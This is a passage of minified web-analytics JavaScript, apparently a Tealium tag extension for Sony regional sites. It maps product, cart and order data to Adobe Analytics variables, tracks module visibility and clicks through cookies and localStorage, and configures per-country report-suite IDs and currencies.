t.slice(0,-1)}()),/^product_details$/gi.test(a.page.pageTemplate)&&(t.aaPageName=t.aaSiteSection+":pdp:"+t.aaProductCategory1+":"+t.aaProductCategory2+":"+a.product.sku,t.aaPageTemplate="pdp",t.aaProductPrice=a.product.price||"",t.aaProducts=[a.product.sku],t.aaProductSKU=a.product.sku,t.aaProductSKUPredefined=void 0!==a.product&&a.product.sku||"",t.aaEvents.push("event32")),/(cart|checkout)/gi.test(a.page.pageTemplate)&&!/thank_you$/gi.test(a.page.name)&&(t.aaProducts=a.cart.sku,t.aaProductsQuantity=a.cart.quantity,t.aaProductsPrice=a.cart.sellingPrice,t.aaRegionalV151=a.cart.promoCode,t.aaRegionalV152=a.cart.origin,/^cart$/gi.test(a.page.pageTemplate)&&t.aaEvents.push("scView"),/confirm$/gi.test(a.page.name)&&t.aaEvents.push("scCheckout")),/thank_you$/gi.test(a.page.name)&&/summary-confirm$/gi.test(document.URL)&&(t.aaProducts=void 0!==a.order&&void 0!==a.order.sku?a.order.sku:[],t.aaProductsQuantity=void 0!==a.order&&void 0!==a.order.quantity?a.order.quantity:[],t.aaProductsPrice=void 0!==a.order&&void 0!==a.order.sellingPrice?a.order.sellingPrice:[],t.aaRegionalV151=a.order.promoCode,t.aaRegionalV152=a.order.origin,t.aaPurchaseID=a.order.id||"",t.aaPaymentType=a.order.paymentType||"",t.aaEvents.push("purchase")),/my orders$/gi.test(a.page.name)&&(t.aaRegionalV153=void 0!==a.user.ordersCount?a.user.ordersCount.toString():"0"),/my products$/gi.test(a.page.name)&&(t.aaRegionalV154=void 0!==a.user.productsCount?a.user.productsCount.toString():"0"),document.addEventListener("addToCart",(function(e){var a=e.detail,o=parseInt(jQuery("a.mini-cart-link > span.mini-cart-label").text())||0;t.aaEvents=[],1===o&&void 0!==a.sku?t.aaEvents.push("scOpen","scAdd"):o>1&&void 0!==a.sku&&t.aaEvents.push("scAdd"),t.aaProducts=a.sku||[],t.aaProductsQuantity=a.quantity||[],t.aaProductSKU=a.sku||[],t.aaLinkTrackEvents=t.aaEvents.join(","),t.aaLinkTrackVars="pageName,products,events,prop10,prop23,prop21,prop1,prop2,prop7,prop9,prop25,prop20,eVar27,eVar20,eVar21,eVar22,eVar1,eVar2,eVar7,eVar46,eVar19",t.aaLinkType="o",t.aaLinkName="Add to Cart",utag.link(t,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})),t}))}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[4]){utag.runonce.ext[4]=1;{window._bsq=window._bsq||{},_bsq.aa=_bsq.aa||{},_bsq.aa.pageLoaded=!1,utag.ext=utag.ext||{},utag.ext.getAppMeasurementTagIDAsArray=function(){var e=[];for(var t in utag.loader.cfg)19063==utag.loader.cfg[t].tid&&e.push(t);return e};navigator.userAgent.match(/iPad/i)||navigator.userAgent.match(/iPhone/i);_bsq.aa.unloadEventName="pagehide",_bsq.aa.getVisitorId=function(){var e="";return"undefined"!=typeof Visitor&&(e=Visitor.getInstance("7286403D53B6AA9A0A490D4C@AdobeOrg").getMarketingCloudVisitorID()||""),void 0!==e&&""!==e||(e="D=mid"),e},_bsq.aa.moduleVisibilityThreshold=75,_bsq.aa.devUnsupporteBrowser="unsupportedbrowser",_bsq.aa.unSupportedBrowserFlag="ubp_l2",_bsq.aa.devOverlayModule="gwt_global_alert",_bsq.aa.overlayModuleFlag="oma_e154",_bsq.aa.loadedElementsLocalStorageKey="bannerLoaded",_bsq.aa.seenElementsLocalStorageKey="bannerViewed",_bsq.aa.loadedModulesLv2CookieName="bannerLoadLv2",_bsq.aa.seenModulesLv2CookieName="bannerViewLv2",_bsq.aa.customerID_localStorageKey="gwt_reporting_key",_bsq.aa.navigationLinkCookieName="nvl_v29",_bsq.aa.filtersCookieName="fil_p31",_bsq.aa.sortingCookieName="sor_p31",_bsq.aa.typeaheadTermCookieName="gpv_tas",_bsq.aa.searchAttemptsCookieName="isa_v57",_bsq.aa.prdRegistrationCookieName="s_e65",_bsq.aa.prdExpressRegistrationCookieName="s_e65exp",_bsq.aa.knowYourCustomerCookie="kyc_aa",_bsq.aa.cashbackProductRegistration="cashback_prd_e65",_bsq.aa.newsletterSubProductRegistrationCookieName="nsltsub_e64",_bsq.aa.target2AnalyticsIntegration=!0,_bsq.aa.analytics2TargetIntegration=!0,_bsq.aa.audieceManagerIntegration={GB:!0},_bsq.aa.visitorIdService=!0,_bsq.aa.supportByTypeCookie="gpv_p70",_bsq.aa.cookiesSizeTotal=4096;var a=void 0,o=new Array,r=!1;null!==window.location.host.match(/^.*.sony.(com|co.uk|ca|com.au)$/gi)&&(r=!0);var n=function(e){_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"hf:"+e)},s=function(e){_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"nv:"+e)};_bsq.aa.cleanregisterPostTrackCallback=0,_bsq.aa.sisterCompanyURLs=[{url:"sonymusic.com",companyName:"Sony Music",useRegex:0},{url:"sony.net",companyName:"Sony.net",useRegex:0},{url:".playstation.",companyName:"PlayStation",useRegex:0},{url:"sonymobile.com",companyName:"Sony Mobile",useRegex:0},{url:"sonyentertainmentnetwork.com",companyName:"Sony Entertainment Network",useRegex:0},{url:"playstationnetwork.com",companyName:"Sony Entertainment Network",useRegex:0},{url:"((((m\\.info\\.|www\\.|response\\.)pro\\.sony\\.eu\\/(pro|events)|(www\\.)?((sonylatvija\\.com)|sony\\.(at|ba|be|bg|ch|co\\.uk|com\\.mk|com\\.tr|cz|de|dk|ee|es|fi|fr|gr|hr|hu|ie|it|lt|lu|lv|nl|no|pl|pt|ro|rs|se|si|sk)))/|^/|^)pro(/|\\?|!?#|$)|m\\.info\\.pro\\.sony\\.eu/webApp/)",companyName:"Sony Professional",useRegex:1},{url:"sonypro-latin.com",companyName:"Sony Professional",useRegex:0},{url:"ps.sony.co.kr/pro/",companyName:"Sony Professional",useRegex:0},{url:"sonypro.com.br",companyName:"Sony Professional",useRegex:0},{url:"sonymusic.ca",companyName:"Sony Music",useRegex:0},{url:"sonybiz.ca",companyName:"Sony Professional",useRegex:0},{url:"pro.sony.",companyName:"Sony Professional",useRegex:0},{url:"pro.sony-asia.com",companyName:"Sony Professional",useRegex:0},{url:"www.sony-psmea.com",companyName:"Sony Professional",useRegex:0},{url:"us\\.(digitalcinema|professional)\\.sony\\.com/pro",companyName:"Sony Professional",useRegex:1},{url:".sonypictures.",companyName:"Sony Pictures",useRegex:0},{url:".facebook.com/Sonypictureskr",companyName:"Sony Pictures",useRegex:0},{url:"columbiapictures.com.ph",companyName:"Sony Pictures",useRegex:0},{url:".facebook.com/sonypicturesthailand",companyName:"Sony Pictures",useRegex:0},{url:"(www.sony.com/(en|ja)(?!(-|_))/?)",companyName:"Sony Corporate",useRegex:1}];var d="",c="",l="",u={};function g(e,t,a,i){_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,"");var r="";if(e&&"undefined"!=typeof jQuery){var n,s="",d="";if(void 0!==(n=jQuery("article")))for(var c=0;c<n.length;c++){n[c];if(null!=(g=jQuery(n[c]).find(".primary-link")))for(var l=0;l<g.length;l++)(d=void 0!==g[l].href?g[l].href:"").toLowerCase().indexOf("cpint=")>-1&&(s=d.trim());void 0!==s&&s.indexOf("cpint=")>-1&&(s=(s=decodeURIComponent(s.substr(s.indexOf("cpint=")+6)).split("&")[0]).split("#")[0],-1===r.indexOf(s)&&(_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,(r.length>0?r+",":"")+s),r=null===_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)))}}if(t&&"undefined"!=typeof jQuery&&void 0!==(n=jQuery(".rp-container a")))for(c=0;c<n.length;c++)(d=void 0!==n[c].href?n[c].href:"").toLowerCase().indexOf("cpint=")>-1&&(s=d.trim()),void 0!==s&&s.indexOf("cpint=")>-1&&(s=(s=decodeURIComponent(s.substr(s.indexOf("cpint=")+6)).split("&")[0]).split("#")[0],-1===r.indexOf(s)&&(_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,(r.length>0?r+",":"")+s),r=null===_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)));if(a&&"undefined"!=typeof jQuery&&(s="","undefined"!=typeof jQuery&&void 0!==(n=jQuery(".article.featured"))))for(c=0;c<n.length;c++){var g;if(void 0!==(g=jQuery(n[c]).find(".primary-link")))for(l=0;l<g.length;l++)(d=void 0!==g[l].href?g[l].href:"").toLowerCase().indexOf("cpint=")>-1&&(s=d.trim());s.indexOf("cpint=")>-1&&(s=(s=decodeURIComponent(s.substr(s.indexOf("cpint=")+6)).split("&")[0]).split("#")[0],-1===(r=null===_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)).indexOf(s)&&(_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,(r.length>0?r+",":"")+s),r=null===_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)))}if(i){var p=[],m="";if(void 0!==u.page.modules)for(c=0;c<u.page.modules.length;c++)if(m=u.page.modules[c].masterName||"","home"===u.page.pageTemplate.toLowerCase()?"secondary"!==u.page.modules[c].lv1&&""!==u.page.modules[c].masterName&&"navigation"!==u.page.modules[c].lv1&&"only_sony_carousel"!==u.page.modules[c].lv2&&"undefined"!=typeof jQuery&&jQuery("[data-masterName='"+m+"']").next().length>0&&-1===jQuery("[data-masterName='"+m+"']").next()[0].className.indexOf("visuallyhidden")&&p.push(m):""!==u.page.modules[c].masterName&&"navigation"!==u.page.modules[c].lv1&&"undefined"!=typeof jQuery&&jQuery("[data-masterName='"+m+"']").next().length>0&&-1===jQuery("[data-masterName='"+m+"']").next()[0].className.indexOf("visuallyhidden")&&p.push(m),void 0!==o)for(l=0;l<o.length;l++){document.querySelectorAll('[data-mastername="'+o[l].replace(/["\\\/]/g,"\\$&")+'"]').length>0&&p.push(o[l])}for(c=0;c<p.length;c++)-1===r.split(",").indexOf(p[c])&&(_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,(r.length>0?r+",":"")+p[c]),r=null===_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey))}}function p(){!function(){var e="",t="";if("undefined"!=typeof jQuery){var a=jQuery("article");if(void 0!==a)for(var o=0;o<a.length;o++){if(m(a[o],_bsq.aa.moduleVisibilityThreshold)){var i=jQuery(a[o]).find(".primary-link");if(void 0!==i)for(var r=0;r<i.length;r++)currentLink=void 0!==i[r].href?i[r].href:"",currentLink.toLowerCase().indexOf("cpint=")>-1&&(t=currentLink.trim());t.indexOf("cpint=")>-1&&(t=(t=decodeURIComponent(t.substr(t.indexOf("cpint=")+6)).split("&")[0]).split("#")[0],-1===(e=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)).indexOf(t)&&(_bsq.utils.docStorage.setItem(_bsq.aa.seenElementsLocalStorageKey,(e.length>0?e+",":"")+t),e=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)))}}}}(),function(){var e="",t="";if("undefined"!=typeof jQuery){var a=jQuery(".rp-slide"),o=0,i=jQuery(".rp-container a");if(null!=i)for(var r=0;r<i.length;r++){var n=i[r];if(m(n,_bsq.aa.moduleVisibilityThreshold)&&null!=(t=jQuery(n).find(".visuallyhidden").data("name"))&&t.length>0){o=0;for(var s=0;s<a.length;s++)jQuery(n).parents(".rp-slide").is(jQuery(a[s]))&&(o=s+1);t=null!==t?0!==o?"hot_"+o+"_"+t:"hot_1_"+t:0!==o?"hot_"+o:"hot_1_",void 0!==jQuery(this).find(".visuallyhidden").data("flag")&&jQuery(this).find(".visuallyhidden").length>0&&(t+="_"+jQuery(n).find(".visuallyhidden").data("flag")),-1===(e=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)).indexOf(t)&&(_bsq.utils.docStorage.setItem(_bsq.aa.seenElementsLocalStorageKey,(e.length>0?e+",":"")+t),e=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey))}}}}(),function(){var e="",t="";if("undefined"!=typeof jQuery){var a=jQuery(".article.featured");if(void 0!==a)for(var o=0;o<a.length;o++){if(m(a[o],_bsq.aa.moduleVisibilityThreshold)){var i=jQuery(a[o]).find(".primary-link");if(void 0!==i)for(var r=0;r<i.length;r++)currentLink=void 0!==i[r].href?i[r].href:"",currentLink.toLowerCase().indexOf("cpint=")>-1&&(t=currentLink.trim());t.indexOf("cpint=")>-1&&(t=(t=decodeURIComponent(t.substr(t.indexOf("cpint=")+6)).split("&")[0]).split("#")[0],-1===(e=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)).indexOf(t)&&(_bsq.utils.docStorage.setItem(_bsq.aa.seenElementsLocalStorageKey,(e.length>0?e+",":"")+t),e=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)))}}}}(),_()}function m(e,t){if(void 0===t&&(t=100),(t>100||t<0)&&(t=100),"undefined"!==e){var a,o=e.getBoundingClientRect().bottom,i=e.getBoundingClientRect().top,r=e.getBoundingClientRect().height,n=document.documentElement.clientHeight;return Math.ceil(e.getBoundingClientRect().left)>=0&&Math.floor(e.getBoundingClientRect().right)<=document.documentElement.clientWidth&&r>0?o<0?a=0:o<n?i<0?a=o/r:i<n&&(a=1):o>=n&&(i<0?a=n/r:i<n?a=(n-i)/r:i>=n&&(a=0)):a=0,Math.floor(100*a)>=t}}function _(){for(var e=[],t=[],a="",i=0;i<u.page.modules.length;i++)a=u.page.modules[i].masterName||"","home"===u.page.pageTemplate.toLowerCase()?"secondary"!==u.page.modules[i].lv1&&""!==u.page.modules[i].masterName&&"navigation"!==u.page.modules[i].lv1&&"only_sony_carousel"!==u.page.modules[i].lv2&&"undefined"!=typeof jQuery&&jQuery("[data-masterName='"+a+"']").next().length>0&&-1===jQuery("[data-masterName='"+a+"']").next()[0].className.indexOf("visuallyhidden")&&e.push(a):""!==u.page.modules[i].masterName&&"navigation"!==u.page.modules[i].lv1&&"undefined"!=typeof jQuery&&jQuery("[data-masterName='"+a+"']").next().length>0&&-1===jQuery("[data-masterName='"+a+"']").next()[0].className.indexOf("visuallyhidden")&&e.push(a);if(void 0!==o)for(var r=0;r<o.length;r++){document.querySelectorAll('[data-mastername="'+o[r].replace(/["\\\/]/g,"\\$&")+'"]').length>0&&e.push(o[r])}for(i=0;i<e.length;i++)if("undefined"!=typeof jQuery){var n=void 0;void 0!==(n="US"===u.page.country&&"Sony Homepage"===u.page.name?jQuery(".moduleTags[data-mastername='"+e[i].replace("regional|","")+"']").next():jQuery(".moduleTags[data-mastername='"+e[i]+"']").next())&&void 0!==n[0]&&n[0].innerHTML.length>0&&(t=t.concat(n))}if(void 0!==t)for(i=0;i<t.length;i++){var s=t[i][0];if("undefined"!==s)if(m(s,_bsq.aa.moduleVisibilityThreshold))if(""!==(c=e[i]))-1===(d=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)).split(",").indexOf(c)&&_bsq.utils.docStorage.setItem(_bsq.aa.seenElementsLocalStorageKey,(d.length>0?d+",":"")+c)}if(_bsq.aa.all_unsupportedBrowser()){var d,c="unsupported browsers";-1===(d=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)).indexOf(c)&&_bsq.utils.docStorage.setItem(_bsq.aa.seenElementsLocalStorageKey,(d.length>0?d+",":"")+c)}}function h(){for(var e=[],t="",a=0;a<u.page.modules.length;a++)t=u.page.modules[a].masterName||"","home"===u.page.pageTemplate.toLowerCase()?"secondary"!==u.page.modules[a].lv1&&""!==u.page.modules[a].masterName&&"navigation"!==u.page.modules[a].lv1&&"only_sony_carousel"!==u.page.modules[a].lv2&&e.push(t):""!==u.page.modules[a].masterName&&"navigation"!==u.page.modules[a].lv1&&e.push(t);for(a=0;a<e.length;a++)"undefined"!=typeof jQuery&&(jQuery(".moduleTags[data-mastername='"+e[a]+"']").next().find("a").click({moduleName:e[a]},y),jQuery(".moduleTags[data-mastername='"+e[a]+"']").next().find(".st-container .st-item").click({moduleName:e[a]},y));if(void 0!==o)for(a=0;a<o.length;a++)"undefined"!=typeof jQuery&&jQuery(".moduleTags[data-mastername='"+o[a]+"']").next().find("a").click({moduleName:o[a]},y);if("undefined"==typeof jQuery||"gallery"!==l&&"subgallery"!==l&&"product accessories"!==l||(void 0!==jQuery().on&&(jQuery("body").on("click",".gallery-item",(function(){if("undefined"!==this&&null!==this){var e="gallery_item";"product accessories"===l&&(e="accesory_item"),1===jQuery(this).find(".visuallyhidden.product[data-name]").length&&(e=e+":"+jQuery(this).find(".visuallyhidden.product[data-name]").data("name"),1===jQuery(this).find(".visuallyhidden.product[data-flag]").length&&(e=e+"|"+jQuery(this).find(".visuallyhidden.product").data("flag"))),"gallery_item"===e&&jQuery(this).find("span[data-product-name]").length>0&&jQuery(this).find("span[data-product-name]").data("product-name")&&(e=e+":"+jQuery(this).find("span[data-product-name]").data("product-name"))}y({data:{moduleName:e}})})),jQuery("body").on("click",".compare-item a",(function(){if("undefined"!==this&&null!==this){var e="compare_item";jQuery(this).parents(".compare-item").find(".product-model").length>0&&(e=e+":"+jQuery(jQuery(this).parents(".compare-item").find(".product-model")[0]).html())}y({data:{moduleName:e}})})),jQuery(".gallery-favorites").on("click",".gallery-item",(function(){if("undefined"!==this&&null!==this){var e="favorite_item";1===jQuery(this).find(".visuallyhidden.product[data-name]").length&&(e=e+":"+jQuery(this).find(".visuallyhidden.product[data-name]").data("name"))}y({data:{moduleName:e}})}))),jQuery(".gallery-content .see-all a").click({moduleName:"gallery_see_all"},y)),"undefined"!=typeof jQuery){var i=function(e){y(e),_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:"+e.data.moduleName)},r="category_";void 0!==u.product&&"undefined"!==u.product.category1&&(r=u.product.category1+"_"+r),jQuery(".subcategory .all-products-link").click({moduleName:r+"all_products"},i),jQuery(".subcategory .accesories-link").click({moduleName:r+"accessories"},i)}}function y(e){_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,void 0!==e.data.moduleName?"cl:"+e.data.moduleName:""),void 0!==this&&"undefined"!=typeof jQuery&&void 0!==this.href&&0!==this.href.indexOf("#")&&void 0!==jQuery(this).attr("href")&&0!==jQuery(this).attr("href").indexOf("#")&&this.href.indexOf("#")!==this.href.length-1&&(this.href.indexOf("cpint=hot")>-1||this.href.indexOf("cpint=HOMEPAGE_THELATEST")>-1||this.href.indexOf("cpint=HOMEPAGE_LATESTNEWS"))}function v(){_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,"");var e=new Array;"undefined"!=typeof jQuery&&jQuery(".tab-pane.active .active-filters-wrap span").each((function(){void 0!==jQuery(this).data("filter-name")&&"productname"===jQuery(this).data("filter-name").toLowerCase()?e.push(jQuery(this).data("filter-name")+"="+jQuery(this).text()):e.push(jQuery(this).data("filter-name")+"="+jQuery(this).data("filter"))})),_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,e.join(";"))}function f(e){return _bsq.utils.docCookies.setItem(_bsq.aa.sortingCookieName,""),void 0!==e&&(_bsq.utils.docCookies.setItem(_bsq.aa.sortingCookieName,e),!0)}_bsq.aa.pdpInteractionEventTriggered=!1,_bsq.aa.getMostGranularProductID=function(e){var t=e.sku||[],a=e.supermodel||[],o=e.model||[];return 1===a.length?a[0]:1===o.length?o[0]:1===t.length?t[0]:""},_bsq.aa.all_isHtmlError=function(e,t){var a=["odw:mysony:validation error","odw:mysony:password link error","cmt:authentication failed.","odw:mysony:validation expired","odw:login registration error","odw:mysony:email link error","spt:tv campaign:error:productcode-purchasedate","spt:tv campaign:error:productcode","spt:tv campaign:error:purchasedate"],o=["mysony:validation error","single post","mysonylogin"],i=!1;if(-1!==e.indexOf("error")&&(i=!0),-1!==t.indexOf("error")&&(i=!0),-1!==t.indexOf("sorry")&&(i=!0),i)for(var r=0;r<a.length;r++)void 0!==a[r]&&e===a[r]&&(i=!1);if(i)for(r=0;r<o.length;r++)void 0!==o[r]&&t===o[r]&&(i=!1);return i},_bsq.aa.all_getRSID=function(e,t){var a={};e=void 0===(e=(e||"").toUpperCase())||""===e||null===e?"GL":e.toUpperCase();a={GL:{region:"EU",domainRegex:"",local_rsid:"",region_rsid:"sonygwt-gwn-err-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-err-sit",SITTrafficForProd:!1,externalLinks:""},AT:{region:"EU",domainRegex:".*.?sony.at$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.at,presscentre.sony.eu,instagram.com"},BA:{region:"EU",domainRegex:".*.?sony.ba$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"BAM",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},BE:{region:"EU",domainRegex:".*.?sony.be$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presse.sony.be,presscentre.sony.eu,instagram.com"},BG:{region:"EU",domainRegex:".*.?sony.bg$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"BGN",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscenter.sony.bg,presscentre.sony.eu,instagram.com"},CH:{region:"EU",domainRegex:".*.?sony.ch$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"CHF",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presse.sony.ch,presscentre.sony.eu,instagram.com"},CZ:{region:"EU",domainRegex:".*.?sony.cz$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"CZK",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},DE:{region:"EU",domainRegex:".*.?sony.de$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.de,presscentre.sony.eu,instagram.com"},DK:{region:"EU",domainRegex:".*.?sony.dk$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"DKK",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},EE:{region:"EU",domainRegex:".*.?sony.ee$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.,instagram.com"},ES:{region:"EU",domainRegex:".*.?sony.es$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.es,presscentre.sony.eu,instagram.com"},EU:{region:"EU",domainRegex:".*.?sony-europe.com$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},FI:{region:"EU",domainRegex:".*.?sony.fi$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},FR:{region:"EU",domainRegex:".*.?sony.fr$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.fr,presscentre.sony.eu,instagram.com"},GB:{region:"EU",domainRegex:".*.?sony.co.uk$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"GBP",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.co.uk,presscentre.sony.eu,instagram.com"},GR:{region:"EU",domainRegex:".*.?sony.gr$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},HR:{region:"EU",domainRegex:".*.?sony.hr$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"HRK",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},HU:{region:"EU",domainRegex:".*.?sony.hu$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"HUF",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},IE:{region:"EU",domainRegex:".*.?sony.ie$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},IT:{region:"EU",domainRegex:".*.?sony.it$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},KZ:{region:"EU",domainRegex:"(.*.?kz.sony.ru|kz..*.sony.ru|.*.?sony.kz)$",local_rsid:"",region_rsid:"sonygwt-gwn-cis-prod",local_currency:"KZT",sit_rsid:"sonygwt-gwn-cis-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},LT:{region:"EU",domainRegex:".*.?sony.lt$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},LU:{region:"EU",domainRegex:".*.?sony.lu$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},LV:{region:"EU",domainRegex:".*.?(sony.lv|sonylatvija.com)$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},MK:{region:"EU",domainRegex:".*.?sony.com.mk$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"MKD",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},NL:{region:"EU",domainRegex:".*.?sony.nl$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"pers.sony.nl,presscentre.sony.eu,instagram.com"},NO:{region:"EU",domainRegex:".*.?sony.no$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"NOK",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},PL:{region:"EU",domainRegex:".*.?sony.pl$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"PLN",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.pl,presscentre.sony.eu,instagram.com"},PT:{region:"EU",domainRegex:".*.?sony.pt$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"EUR",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.pt,presscentre.sony.eu,instagram.com"},RO:{region:"EU",domainRegex:".*.?sony.ro$",local_rsid:"",region_rsid:"sonygwt-gwn-eu-prod",local_currency:"RON",sit_rsid:"sonygwt-gwn-eu-sit",SITTrafficForProd:!1,externalLinks:"presscentre.sony.eu,instagram.com"},RU:{region:"EU",domainRegex:".*.?sony.ru$",local_rsid:"",region_rsid:"sonygwt-gwn-cis-prod",local_currency:"RUB",sit_rsid:"sonygwt-gwn-cis-sit",SITTrafficForProd:!1,externalLinks: